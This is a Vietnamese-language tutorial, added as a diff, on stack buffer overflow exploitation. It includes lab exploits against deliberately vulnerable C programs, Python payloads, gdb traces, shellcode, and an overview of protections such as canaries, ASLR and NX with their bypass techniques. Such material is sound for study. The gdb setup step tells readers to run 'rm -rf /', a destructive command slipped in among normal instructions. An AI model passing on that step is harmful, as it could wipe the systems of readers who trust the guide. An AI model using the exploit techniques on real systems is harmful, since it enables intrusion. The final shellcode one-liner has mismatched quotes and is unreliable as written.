@@ -1,0 +1,900 @@
+|=----------------------------------------------------------------------=|
+|=----------------------=[ Tutorial stackoverflow ]=--------------------=|
+|=----------------------------------------------------------------------=|
+|=----------------------=[  Protection Mechanisms ]=--------------------=|
+|=----------------------------------------------------------------------=|
+|=----------------------=[      felix             ]=--------------------=|
+
+                                CONTENTS        
+    __^__                                                         __^__
+   ( ___ )-------------------------------------------------------( ___ )
+    | / | 0x01 Chúc mừng năm mới                                  | \ |
+    | / | 0x02 Chuẩn bị Lab                                       | \ |
+    | / | 0x03 Cơ bản về Stackoverflow                            | \ |
+    | / |      .1 Tut1 - Bufferoverflow                           | \ |
+    | / |      .2 Tut2 - Jump to function                         | \ |
+    | / |      .3 Tut3 - Shellcode                                | \ |
+    | / | 0x04 Các cơ chế bảo vệ                                  | \ |
+    | / |      .1 Stack Data Protection                           | \ |
+    | / |          -Canaries                                      | \ |
+    | / |          -Ideal Stack Layout (Ngăn xếp lý tưởng)        | \ |
+    | / |          -AAAS: ASCII Armored Address Space             | \ |
+    | / |          -ASLR: Address Space Layout Randomization      | \ |
+    | / |      .2 W^X (Either Writable or Executable) Memory      | \ |
+    | / |      .3 Non-Executable Stack                            | \ |
+    | / | 0x05 Checksec                                           | \ |
+    | / |          -ASLR                                          | \ |
+    | / |          -CANARY                                        | \ |
+    | / |          -FORTIFY                                       | \ |
+    | / |          -NX                                            | \ |
+    | / |          -PIE                                           | \ |
+    | / |          -RELRO                                         | \ |
+    | / | 0x06 Tùy chọn khi biên dịch trong gcc                   | \ |
+    | / |                                                         | \ |
+    |___|_______[  felix - No pain, no gain  ]___________|___|
+   (_____)-------------------------------------------------------(_____)
+
+    -----------(   0x01 Chúc mừng năm mới )------------------
+                 ,~.
+                ,-'__ `-,
+               {,-'  `. }              ,')
+              ,( a )   `-.__         ,',')~,
+             <=.) (         `-.__,==' ' ' '}
+               (   )                      /
+                `-'\   ,                  )
+                    |  \        `~.      /
+                    \   `._        \    /
+                     \     `._____,'   /
+                      `-.            ,'
+                         `-.      ,-'
+                            `~~~~'
+                            //_||
+                         __//--'/`        Đinh Dậu  
+                       ,--'/`  '
+                          '
+    Xưa kia ta ở trên trời 
+    Bởi hay uống rượu trời đày xuống đây.
+    Xuống đây ta uống cho say
+    Xơ gan cổ chướng lại bay về trời.
+
+    -----------(   0x02 Chuẩn bị lab )------------------
+    
+Do bài tut này chỉ nói về các lỗ hổng trên linux nên bạn cần 1 máy ảo linux    
+    Linux
+        felix@ubuntu:~/over$ uname -a
+        Linux ubuntu 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 i686 i686 i386 GNU/Linux
+    Cài đặt gdb PEDA: (để debug chương trình)
+        - Bạn vô đường dẫn nè: https://github.com/longld/peda
+        - Open terminal gõ:
+            git clone https://github.com/longld/peda.git ~/peda
+            echo "source ~/peda/peda.py" >> ~/.gdbinit
+            echo "felix handsome!"  
+          
+    -----------(   0x03 Cơ bản về Stackoverflow )------------------
+    
+----[3.1 - Tut1 -Bufferoverflow ]----
+Source code over1.c
+------------over1.c------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char **argv)
+{
+    int i = 0;
+    char buffer[32];
+
+    gets(buffer);    
+    
+    printf("buffer : %s (%p) \n",buffer, &buffer);          //in ra giá trị của buffer và địa chỉ của buffer     
+    printf ("i = %d (%p)\n", i, &i);                        //in ra giá trị của i và địa chỉ của i 
+    
+    if(i==1)
+    {
+        printf("You win !\n");
+    }
+        
+    return 0;
+}
+-------------snip------------------
+
+Biên dịch với option -fno-stack-protector (để tắt canary) và -z execstack (tắt NZ) cái này mình sẽ nói sau
+    felix@ubuntu:~/over$ gcc -fno-stack-protector -z execstack -o over1 over1.c 
+    Bỏ qua mấy cai warning đi, kệ nó nha
+    felix@ubuntu:~/over$ ./over1 
+    aaaaaaaaaaaa
+    buffer : aaaaaaaaaaaa (0xbfa251ec) 
+    i = 1 (0xbfa251e8)
+    
+Do hệ điều hành từng máy, nên có thể vị trí của buffer và i sẽ khác trên máy của bạn 
+(do bật aslr(random địa chỉ) nữa _ cái này mình sẽ nói sau (dm sao nói sau nhiều thế) :p)
+
+Như ta đã biết mô hình ngăn xếp của 1 hàm : (cái này search google đọc kỹ nha)
+    hign
+        |-----------------------|
+        |        arg            |    
+        |-----------------------|
+        |        ret            |
+        |-----------------------|
+        |        ebp            |
+        |-----------------------|
+        |        local          |
+        |-----------------------|
+    low
+    
+Ta áp dụng vào bài này sẽ được ngăn xếp:
+    hign
+        |-----------------------|
+        |        arg main       |    
+        |-----------------------|
+        |        ret main       |
+        |-----------------------|
+        |        ebp main       |
+        |-----------------------|
+        |        i (4 byte)     |
+        |-----------------------|       
+        |                       |
+        |                       |
+        |                       |
+        |        buffer         |
+        |       (32  byte)      |
+        |                       |
+        |                       |
+        |-----------------------|
+    low    
+    
+Do hàm gets không kiểm tra size đầu vào nên khi ta ghi nhiều quá 32 byte của mảng buffer, ta sẽ ghi đè lên giá trị của biến i     
+Ta thử khai thác:
+    felix@ubuntu:~/over$ ./over1
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab (0xbfe7935c) 
+    i = 98 (0xbfe7945c)    
+
+Ta nhập vào 32 chữ "a" và 1 chữ b => kết quả ta đã ghi tràn qua mảng buffer và ghi đè lên biến i 
+=> i đã bị thay đổi thành 98 = 0x62 (mã hex của chữ "b") (lololo)
+Vậy để in màn hình chữ "You win" ta cần nhập vào 32 chữ b và mã hex 0x01 (hehe đơn giản quá)
+Quay lại và thử ngay thôi:
+    felix@ubuntu:~/over$ ./over1   
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1 (0xbf8f564c) 
+    i = 49 (0xbf8f574c)
+Hình như có cái gì đó sai sai (@@)!
+Sao dòng chữ "you win" vẫn không xuất hiện    
+Kiểm tra lại output, "what the fox" i=49=0x31 (mã hex của ký tự 1). 
+Mẹc đề bài bắt ta nhập vào mã hex 0x01, nhưng mã hex 0x01 lại là kiểu nonprintable (đan mạch (_ _)!)
+May sao ta có thể sử dụng python để in ra:
+    felix@ubuntu:~/over$ python -c 'print "a"*32 + "\x01"' | ./over1
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  (0xbfab74dc) 
+    i = 1 (0xbfab74fc)
+    You win !
+Đoạn python -c 'print "a"*32 + "\x01"' là để in ra 32 chữ a và ký hex 0x01
+Dấu "|" là pipe trong linux, đại khái là A|B thì A được coi là input của B
+Ok xong over1 nha
+Tiếp theo mình sẽ qua over2
+
+----[3.2 - Tut2 - Jump to function ]---- 
+Source code over2.c
+------------over2.c------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void never_print()
+{
+    printf("You win !\n");
+    exit(0);
+}
+
+int main(int argc, char **argv)
+{
+    char buffer[32];
+    gets(buffer);   
+    printf("buffer : %s (%p) \n",buffer, &buffer); 
+    return 0;
+}
+--------------snip-------------
+
+Biên dịch với option -fno-stack-protector  và -z execstack
+    felix@ubuntu:~/over$ gcc -fno-stack-protector -z execstack -o over2 over2.c 
+
+Ok, ta tiếp tục trở lại tut         
+Mục tiêu của chúng ta vẫn là in ra được chữ "You win"
+Nhưng nhìn vào đoạn code ta có thể thấy hàm never_print như đúng tên gọi của nó (bố éo bao giờ được gọi)
+=> thể thì ta làm sao để in ra được dòng chữ "You win" 
+Để in ra được "You win" hãy đến "ĐIỆN MÁY XANH" (lololo)
+Quay lại ngăn xếp ta có 
+    hign
+        |-----------------------|
+        |        arg main       |    
+        |-----------------------|
+        |        ret main       |
+        |-----------------------|
+        |        ebp main       |
+        |-----------------------|
+        |                       |
+        |        buffer         |
+        |       (32  byte)      |
+        |                       |
+        |-----------------------|
+    low    
+
+Điều gì sẽ xảy ra nếu ta ghi quá 32 byte và "ĐÈ" lên [ret main]
+Thử ra ngoài chạy   (48 chữ "a")
+    felix@ubuntu:~/over$ ./over2 
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (0xbfb90410) 
+    Segmentation fault (core dumped)
+    
+Ok  Segmentation fault vì sao vậy ta (@@)!
+Nào mình cùng đi tìm hiểu:   
+Mở gdb peda lên:
+    open terminal gõ:
+    $ rm -rf /              
+    $ gdb ./over2 
+Nếu bạn thấy dòng chữ màu đỏ và dấu nhắc: gdb-peda$
+Ok done
+Một số lệnh trên gdb-peda
+    gdb-peda$ pdisas main           # hiển thị toàn bộ code hàm main
+    gdb-peda$ pdisas never_print    # never_print
+    gdb-peda$ b * 0x08048480        # đặt chương trình dừng ở địa chỉ 0x08048480
+    
+Ok giờ ta chạy thử chương trình    
+    gdb-peda$ r                     # chạy chương trình 
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (0xbffff6d0) 
+    [----------------------------------registers-----------------------------------]
+    EAX: 0x0 
+    EBX: 0xb7fc3ff4 --> 0x1a5d7c 
+    ECX: 0x0 
+    EDX: 0x0 
+    ESI: 0x0 
+    EDI: 0x0 
+    EBP: 0x61616161 ('aaaa')
+    ESP: 0xbffff6fc ('a' <repeats 13 times>)
+    EIP: 0x8048480 (<main+56>:      ret)
+    EFLAGS: 0x200286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+       0x8048475 <main+45>: call   0x8048330 <printf@plt>
+       0x804847a <main+50>: mov    eax,0x0
+       0x804847f <main+55>: leave  
+    => 0x8048480 <main+56>: ret    
+       0x8048481:   nop
+       0x8048482:   nop
+       0x8048483:   nop
+       0x8048484:   nop
+    [------------------------------------stack-------------------------------------]
+    0000| 0xbffff6fc ('a' <repeats 13 times>)
+    0004| 0xbffff700 ("aaaaaaaaa")
+    0008| 0xbffff704 ("aaaaa")
+    0012| 0xbffff708 --> 0xbfff0061 --> 0x0 
+    0016| 0xbffff70c --> 0xb7fdc858 --> 0xb7e1e000 --> 0x464c457f 
+    0020| 0xbffff710 --> 0x0 
+    0024| 0xbffff714 --> 0xbffff71c --> 0x0 
+    0028| 0xbffff718 --> 0xbffff79c --> 0xbffff8c7 ("SHELL=/bin/bash")
+    [------------------------------------------------------------------------------]
+    Legend: code, data, rodata, value
+
+    Breakpoint 4, 0x08048480 in main ()
+    gdb-peda$ 
+
+
+"WHAT THE FOX SAY", cái gì mà tuôn ra lắm thế (Nhìn kinh vl (@@)!)
+Đừng lo vì đã có felix handsome
+    Phần "registers" đơn giản là chỉ hiển thị giá trị các thanh ghi
+        Các thanh ghi này có ý nghĩa gì thì bạn nên học assembler rồi quay lại nha
+        Đùa thôi, bạn chỉ cần để ý thanh ghi 
+            EIP : là thanh ghi dùng để lưu địa chỉ lệch của mã lệnh sắp tiến hành = 0x8048480 (để ý cái dấu "=>" không, nó đó)
+                  Vì mình đặt breakpoint (gdb-peda$ b * 0x08048480) nên chương trình chạy đến đây sẽ dừng lại
+            ESP : ESP chỉ dùng làm con trỏ ngăn xếp (chỉ vào đầu ngăn xếp) =  0xbffff6fc
+    Phần "code" hiển thị các lệnh trước và sau eip
+    Phần "stack" hiển thị ngăn xếp 
+
+Ok tiếp tục chạy từng câu lệnh:
+    gdb-peda$ s         #chạy 1 câu lệnh
+    [----------------------------------registers-----------------------------------]
+    ...
+    ESP: 0xbffff700 ("aaaaaaaaa")
+    EIP: 0x61616161 ('aaaa')
+    ...
+    [-------------------------------------code-------------------------------------]
+    Invalid $PC address: 0x61616161
+    [------------------------------------stack-------------------------------------]
+    0000| 0xbffff700 ("aaaaaaaaa")
+    0004| 0xbffff704 ("aaaaa")
+    ...
+    [------------------------------------------------------------------------------]
+    Legend: code, data, rodata, value
+    0x61616161 in ?? ()
+Đập ngay vào mắt là EIP: 0x61616161 ('aaaa')
+Vậy chương trình bị dừng lại tại địa chỉ 0x61616161 , máy nó éo biết 0x61616161 là cái gì nên nó mới 0x61616161 in ?? ()
+Ok ta lại chạy lai chương trình với 44 chữ "a" và 4 chữ "b"
+    gdb-peda$ r
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+    gdb-peda$ s
+    [----------------------------------registers-----------------------------------]
+    ESP: 0xbffff700 --> 0x0 
+    EIP: 0x62626262 ('bbbb')
+    EFLAGS: 0x200286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+    Invalid $PC address: 0x62626262
+    [------------------------------------stack-------------------------------------]
+    Legend: code, data, rodata, value
+    0x62626262 in ?? ()
+
+Bingo, vậy ta có thể điều chình "dòng chảy" của chương trình bằng cách ghi 44 chữ "a" + 4 byte của địa chỉ cần chương trình nhảy đến   
+Mà mục tiêu của ta ở đây là nhảy vào hàm never_print
+Kiểm tra địa chỉ cùa hàm never_print
+    gdb-peda$ p never_print
+    $1 = {<text variable, no debug info>} 0x8048464 <never_print>
+Ok 0x8048464 <never_print>
+Quit khỏi peda
+    gdb-peda$ quit
+
+Ý tưởng:
+    hign
+        |-----------------------|
+        |        arg main       |    
+        |-----------------------|
+        |        ret main       |-->Bị ghi đè bởi giá trị never_print ->nhảy đến never_print
+        |-----------------------|
+        |        ebp main       |
+        |-----------------------|
+        |                       |
+        |        buffer         |
+        |       (32  byte)      |
+        |                       |
+        |-----------------------|
+    low       
+luôn và ngay nào:
+    felix@ubuntu:~/over$ python -c 'print "a"*44 + "\x08\x04\x84\x64"' | ./over2
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�4 (0xbffd9330) 
+    Segmentation fault (core dumped)
+Oack, sao lại thế, vâng bạn nghĩ đúng rồi đấy, mình cũng éo biết =))
+Đùa thôi:
+    Theo quy tắc (little endian) search nha ta cần ghi địa chỉ 0x8048464 => "\x64\x84\x04\x08"
+    felix@ubuntu:~/over$ python -c 'print "a"*44 + "\x64\x84\x04\x08"' | ./over2
+    buffer : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaad (0xbf8e31b0) 
+    You win !
+
+Ok xong over2 nha
+Tiếp theo mình sẽ qua over3
+
+----[3.3 Tut3 - Shellcode ]----
+Source code over3.c
+------------over3.c------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+    char buffer[64];
+    gets(buffer);   
+    printf("buffer : %s (%p) \n",buffer, &buffer); 
+    return 0;
+}
+--------------snip-----------------
+
+Biên dịch với option -fno-stack-protector và -z execstack
+    felix@ubuntu:~/over$ gcc -fno-stack-protector -z execstack -o over3 over3.c 
+    Tắt random địa chỉ (aslr), lúc này các địa chỉ sẽ là cố định không radom nữa
+        felix@ubuntu:~/over$ su
+        Password: ******
+        root@ubuntu:/home/felix/over# echo 0 > /proc/sys/kernel/randomize_va_space
+        root@ubuntu:/home/felix/over# cat /proc/sys/kernel/randomize_va_space
+        0       #bằng 0 là ok nha
+        root@ubuntu:/home/felix/over# exit
+
+Mục tiêu của chương trình vẫn là in ra màn hình dòng chữ "You win"
+Thế nào cũng có bạn đọc sẽ nghĩ : "What the fox" đùa à. Làm éo gì có cái gì mà đòi in ra
+Mời bạn vô đây:
+    http://www.nhaccuatui.com/bai-hat/nghi-ngo-ngo-kien-huy-ft-dong-nhi.SF59JrjuASed.html
+    http://dantri.com.vn/phap-luat/dam-cong-an-vien-tu-vong-vi-nghi-ngo-noi-xau-minh-20161013091913688.htm
+
+Trước tiên ta cần hiểu shellcode là gì đã:
+    "Shellcode là một đoạn mã máy nhỏ cho phép thực hiện chỉ một nhiệm vụ nào đó bên trong một chương trình bị khai thác"
+
+Ok vậy với bài này ta sẽ cần 1 shellcode in ra màn hình dòng chữ "You win"
+Để viết được shellcode, bạn hãy tìm học assem nha
+Đại khái là với bài này, bạn paste đoạn sau vào file shellcode.asm
+
+-------shellcode.asm--------------------
+global _start
+
+section .text
+_start:
+        jmp Call_shellcode
+        
+        shellcode:
+            ; print hello world !
+            xor eax, eax
+            mov al, 0x04
+            
+            xor ebx, ebx
+            mov bl, 0x1
+            
+            
+            pop ecx
+            
+            xor edx, edx
+            mov dl, 9
+            int 0x80
+
+            ;exit
+            xor eax, eax
+            mov al, 0x01
+            xor ebx, ebx
+            mov bl, 0x10
+            int 0x80
+        
+        Call_shellcode:
+            call shellcode
+            message: db "You win!", 0xA
+------------snip--------------------------
+
+Biên dịch và chạy thử shellcode;
+    felix@ubuntu:~/over$ nasm -f elf32 -o shellcode.o shellcode.asm
+    felix@ubuntu:~/over$ ld shellcode.o -o shellcode
+    felix@ubuntu:~/over$ ./shellcode 
+    You win!
+   
+Tiếp theo trích xuất opcode (cứ làm theo thôi đừng hỏi :( vì mình cũng éo biết đâu
+felix@ubuntu:~/over$ for i in $(objdump -d shellcode -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\xeb\x19\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x09\xcd\x80\x31\xc0\xb0\x01
+\x31\xdb\xb3\x10\xcd\x80\xe8\xe2\xff\xff\xff\x59\x6f\x75\x20\x77\x69\x6e\x21\x0a
+   
+Ok vậy ta đã có 1 shellcode in ra màn hình chữ "You win!"
+Đại khái là khi EIP nhảy vào đầu đoạn shellcode trên nó sẽ thực hiện đoạn mã opcode và in ra dòng chữ "You win!"
+
+Nhưng ta phải nhét đoạn shellcode này vào đâu bây giờ
+...
+Bingo, vào buffer
+Vì đề bài cho ta nhập mọi dữ liệu và lưu trữ vào trong buffer qua hàm gets(buffer);  
+Vậy ta cần làm 2 bước:
+    -Ghi đoạn shellcode trên vào buffer
+    -Ghi đè qua buffer đến eip, làm giá trị eip = địa chỉ của buffer
+    Vậy khi kết thúc hàm main, chương trình nhảy về buffer và thực hiện đoạn shellcode của ta
+    
+    hign
+        |-----------------------|
+        |        arg main       |    
+        |-----------------------|
+        |        ret main       |-------    ghi đè bởi địa chỉ của buffer
+        |-----------------------|       |
+        |        ebp main       |       |
+        |-----------------------|       |
+        |                       |       |
+        |        buffer         |       |
+        | 64 byte chứa shellcode|       |
+        |                       |       |
+        |-----------------------|<------
+    low   
+
+Ta kiểm tra địa chỉ của buffer
+Do aslt tắt nên địa chỉ của buffer là cố định
+    felix@ubuntu:~/over$ ./over3
+    aaaaaaaaaaaaaaaaaa
+    buffer : aaaaaaaaaaaaaaaaaa (0xbffff6f0) 
+=> Địa chỉ của buffer là 0xbffff6f0
+=> Ta cần nhập "shellcode" + "a"*N + "0xbffff6f0"
+Bài giải thì để bạn đọc tự làm nha, 
+Hint:
+    Nhớ dùng gdb peda để kiểm tra xem N bằng bao nhiêu :))
+    Các bạn có để ý ở bài 3 này mình cho "char buffer[64]" khác với 2 bái trước là "char buffer[32]" hem; 
+    vì độ dài shellcode là xx byte =))
+    
+python -c "print "\xeb\x19\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x09\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xb3
+\x10\xcd\x80\xe8\xe2\xff\xff\xff\x59\x6f\x75\x20\x77\x69\x6e\x21\x0a" + "\x90"*35 + "\xf0\xf6\xff\xbf"' | ./over3
+
+-----------------snip------------------------------
+Ok vậy là mình đã lược qua 3 tut basic về stackoverflow. Nhưng cuộc đời không phải lúc nào cũng toàn màu hồng.
+Lúc này là lúc mình sẽ trả lời các bạn "CÁI NÀY MÌNH SẼ NÓI SAU" ở các bài trước là gì :)
+Nào mình cùng bật peda
+    felix@ubuntu:~/over$ gdb ./over1
+    gdb-peda$ checksec
+    CANARY    : disabled
+    FORTIFY   : disabled
+    NX        : disabled
+    PIE       : disabled
+    RELRO     : Partial
+
+OMG! CLGT. Vầng các bạn đoán đúng rồi đấy checksex => kiểm tra sex (:p)
+Đùa tý thôi theo ngôn ngữ kiểu "hàn lâm" : Cùng với sự gia tăng đến chóng mặt của các mã lỗi thực thi và khai thác,
+các nhà cung cấp hệ điều hành bắt đầu bổ sung các cơ chế bảo vệ nói chung để bảo vệ người dùng của họ.
+Nên ta sẽ cùng đi tìm hiểu các cơ chế này ntn nha.
+
+Bài dài qua, ngại viết. Nên phần sau đọc mình không giải thích kỹ đâu nha.
+Phần sau mình chỉ sưu tầm và dịch lại theoi ý hiểu của mình nên một số chỗ mình vẫn để nguyên tiếng anh, vì dốt nên khồng biết dịch :p
+
+    -----------(   0x04 Các cơ chế bảo vệ )------------------
+
+----[ 4.1 - Stack Data Protection]----
+Canaries
+    canary có nghĩa chim hoàng yến. Những người thợ mỏ  đã sử dụng một con chim hoàng yến cùng đi xuống hầm mỏ với họ. 
+    Do chim yến rất nhạy cảm với khí độc nên được dùng phát hiện những khí độc phát ra trong hầm mỏ. 
+    Khi con chim yến có phản ứng với khí lò cũng là lúc người thợ phải chạy nhanh để thoát khỏi hầm mỏ.  
+
+    Canaries (hoặc cookie) thường giá trị 32-bit (8 byte) đặt ở đâu đó giữa các bộ đệm và các thông tin nhạy cảm. 
+    Trong trường hợp bị lỗi tràn bộ đệm, Canaries bị ghi đè và các ứng dụng có thể phát hiện sự thay đổi của các thông tin nhạy cảm.
+    Tuy nhiên canary không thể bảo vệ được : local variables, function arguments, or the saved frame pointer and other registers.
+    Ngày nay nó được thay thế bởi ProPolice và  Visual Studio Compiler /Gs option.
+
+    Có 3 loại canaries : 
+        terminator
+            Chỉ bao gồm NUL (0x00000000), nhưng sau đó nó được thay thế bởi terminator canary (0x000aff0d)
+            '\x00' to stop strcpy() and cousins, '\x0d' and '\x0a' to stop gets() and '\xff' (EOF) for some functions and some hardcoded loops
+        random 
+            Thông thường, một Canary ngẫu nhiên được tạo ra lúc khởi tạo chương trình, và được lưu trữ trong một biến global.
+        random XOR
+            Đem giá trị random canaries xor với toàn bộ hoặc một phần dữ liệu (arg, eip và ebp). 
+            Khi dữ liệu hoặc con trỏ eip bị ghi đè, mà canaries bị leak thì chương trình vẫn phát hiện được. 
+            Tuy nhiên cách này vẫn không hạn chế được khi attacker return to shellcode.
+    Tại phiên bản của StackGuard đều hỗ trơ cả 3 loại canary, ProPolice hỗ trợ terminator and random canaries.
+    
+    Điểm yếu của canaries là vẫn có thể đọc được ra từ stack
+    StackGuard
+    ↑ Lower addresses
+        var2                 4 bytes
+        buf                  80 bytes
+        var1                 4 bytes
+        saved ebp            4 bytes
+        canary               4 bytes
+        return address       4 bytes
+        arg 4 bytes
+    ↓ Higher addresses
+    
+Ideal Stack Layout (Ngăn xếp lý tưởng => sắp xếp lại stack)
+    Để bảo vệ thông tin nhạy cảm được lưu trữ sau bộ đệm dễ bị tổn thương, có ít nhất hai cách khác nhau. 
+        Có thể thêm một Canary sau mỗi bộ đệm, và xác minh lại mỗi lần trước khi truy cập vào bất kỳ dữ liệu khác được lưu trữ sau đó, 
+        Có thể di chuyển các dữ liệu nhạy cảm ra khỏi lỗi tràn bộ đệm bằng cách sắp xếp lại các biến local trên ngăn xếp.
+    
+    Cách thứ hai được giới thiệu trong ProPolice ngày 19 tháng 6 năm 2000. 
+    Những ý tưởng này sau đó đã dần dần được giới thiệu trong Visual Studio của Microsoft trong compiler /Gs option.
+    ProPolice (-fstack-protector option on modern GCCs)
+    
+    Chuyển local buffer đến cuối stack frame, và chuyển những biến local khác đến trước nó. Nó cũng copy 1 bản sao của arguments vào biến local (để ý arg copy)
+    ProPolice
+    ↑ Lower addresses
+        arg copy            4 bytes
+        var2                4 bytes
+        var1                4 bytes
+        buf                 80 bytes
+        canary              4 bytes
+        saved ebx           4 bytes
+        saved ebp           4 bytes
+        return address      4 bytes
+        arg (not used)      4 bytes
+    ↓ Higher addresses
+    
+    Visual Studio 2005 introduced some new features in the /GS protection; after that, the protection includes:
+        - Random canary 
+        - Frame pointer và các thanh ghi được vảo vệ bởi canary
+        - Chuyển local buffer đến cuối stack frame
+        - Biến local chuyển đến đầu frame
+        - Copy 1 bản sao của arguments vào biến local
+     
+    The /GS protection is not enabled in every function, nor for every argument. There might be a problem in the logic that decides what to protect.  
+    
+AAAS: ASCII Armored Address Space 
+    ASCII-Armor là cơ chế map các địa chỉ thư viện quan trọng như libc đến một vùng vi bộ nhớ chứa một byte NULL
+    Lúc đầu trong linux kernel nó được map lên ở địa chỉ 0x00001000 nhưng về sau được chuyển sang 0x00110000
+    Trước khi có các cuộc thảo luận AAAS, Windows đã được nạp code thực thi vào địa chỉ 0x00400000, với địa chỉ stack mặc định tại 0x0012xxxx 
+    
+ASLR: Address Space Layout Randomization  
+    Trong các tut trên ta có thể thấy nếu tất cả các địa chỉ từ địa chỉ hàm, thư viên, địa chỉ stack, heap, code đều random;
+    Thì khi ta có thể ghi đè thanh ghi eip thì attacker cũng không biết sẽ "nhảy" về đâu. 
+    Điều này thât tuyệt vời, nhưng lại có mộtg hạn chế là vấn đề hiệu suất và vẫn có thể bị tân công bằng phương pháp map-ret2gets-code để tạo ra một vùng nhớ W+X.
+    Trong một số distributions của linux thì /proc/<pid>/maps chứa mã đã được chứng minh là hữu ích trên một số khai thác, và một số hệ thống vẫn còn ánh xạ nó ở một vị trí cố định => thành một mục tiêu rất thú vị cho ret2syscall hoặc ret2code 
+    Một phương pháp nữa để có thể tấn công aslr là brutefork, tuy nhiên để brutefork với cấu hình máy 2-GHz dual core chạy Linux, ta mất khoảng 1 phút cho chương trinh 16bits (2^16 lần), 24 bits sẽ mất khoảng 7.2 giờ
+    
+    Trên các ứng dụng đa luồng, rất phổ biến trong Windows, không gian địa chỉ có thể không được tái ngẫu nhiên cho mỗi thread,
+    =>dễ dàng hơn để thu thập thông tin tốt hơn, nhưng đồng thời nó gây ra khả năng crash toàn bộ ứng dụng toàn bộ => hỏng khai thác.
+    Nhưng trên linux (process fork()) => ko bị crash.
+    
+----[ 4.2 - W^X (Either Writable or Executable) Memory]----
+Đây là cơ chế giúp cho bộ nhớ chỉ có một trong 2 quyên, đã ghi thì không thể thực thi, đã có thể thực thi thì không thể ghi.
+Một ví dụ đầu tiên của W^X là Pax. Nhưng Pax đã không bao giờ có trong bản phân phối Linux nào cả, nhiều khả năng do hiệu suất, bảo trì, mặc dù ngày này vẫn có một vài bản phân phối có một số loại W ^ X.
+-In September 2003 AMD chip support "NX"  (Non-eXecutable);
+-Intel similar feature called       "ED"  (Execute Disable). 
+-Microsoft  XP SP2                  "DEP" (Data Execution Prevention) the NX bit.
+    The software Safe Structured Exception Handling (SafeSEH) implementation, as explained in the section “Windows SEH Protections”
+        Các SafeSEH luôn được bật cho các ứng dụng thực thi (Exe) và thư viện động (DLL) được biên soạn sử dụng Visual Studio. 
+        Không có tùy chọn để vô hiệu hóa các biện pháp bảo vệ.
+    The hardware NX support for W^X; and some kind of software only W^X supports
+        Trên kiến ​​trúc 64-bit, DEP phần cứng được hỗ trợ và W ^ X luôn kích hoạt cho mỗi ứng dụng, và không thể bị vô hiệu hóa.
+        Đối với hệ thống 32-bit W^X bảo vệ cả phần cứng và phần mềm, tuy nhiên có thể được vô hiệu, kích hoạt, hoặc chọn lọc bật hoặc tắt cho các ứng dụng cụ thể. Mặc định là disable for all application.
+
+Tuy nhiên W^X không hiệu quả đối với ret2code
+
+Một câu hỏi đặt ra là ta có thể chuyển  W^X thành  W+X? Câu trả lời là YES
+    Windows
+        VirtualProtect(addr, size, 0x40, writable_address);
+    OpenBSD
+        mprotect(addr, size, 7);
+        mprotect thì size phải là một bội số của 4K
+        Có thể dùng mmap thay thế
+            mmap(0xbffff000, 0x1000, 7, 0x32, 0, 0);
+            
+    Trong linux nếu Pax được install thì cách này sẽ không hoạt động vì Pax không cho phép W+X. Nhưng nếu ExecShield được install thì vẫn có thể được 
+    
+----[ 4.3 - Non-Executable Stack]----
+Cơ chế bảo vệ này nói nôm na là không cho excute trên stack
+Tuy nhiên cơ chế bảo vệ này có thể bị bypass bởi rất nhiều kỹ thuật ví dụ như:
+(Các kỹ thuật này các bạn có thể search google để tìm hiểu nha)
+    
+ret2libc, ret2plt, ret2strcpy, ret2gets, ret2syscall, ret2data, ret2text, ret2code, ret2dl-resolve, and chained ret2code or chained ret2libc 
+
+ret2data 
+    injected code/egg/shellcode in the data section, inject in heap then jump
+    
+ret2libc 
+    Ý tưởng là nhảy thẳng về địa chỉ hàm trong libc ví dụ như hàm system()
+    Để bảo vệ chương trình khỏi ret2libc, 10/8/1997, Solar Designer đã đề xuất ý tưởng ASCII Armored Address Space (AAAS)
+    
+ret2strcpy
+    Kỹ thuật này tương tự như ret2libc. The simple is to return to strcpy() with an src parameter pointing to the code in the stack buffer (or anywhere else in memory) and a dst parameter pointing to the chosen writable and executable memory address
+    ↑ Lower addresses
+        &strcpy           4 bytes     Aligned with overwritten return address
+        go_after_strcpy   4 bytes     Where to go after strcpy()
+        dest              4 bytes     A known writable and executable location
+        src               4 bytes     Must point to injected code
+    ↓ Higher addresses  
+
+ret2gets
+    ↑ Lower addresses
+        &gets             4 bytes     Aligned with overwritten return address
+        go_after_dest     4 bytes     Where to go after gets()
+        dest              4 bytes     A known writable and executable location
+    ↓ Higher addresses
+
+ret2code    
+    use pop-ret, pop-pop-ret ...
+
+ret2syscall
+    x86
+        EAX : System call Number - Return Value
+        EBX, ECX, EDX, ESI, EDI : Argument
+        int 0x80
+
+    x64
+        RAX : System call Number - Return Value
+        RDI, RSI, RDX, R10, R8, R9 : Argument
+        syscall
+    
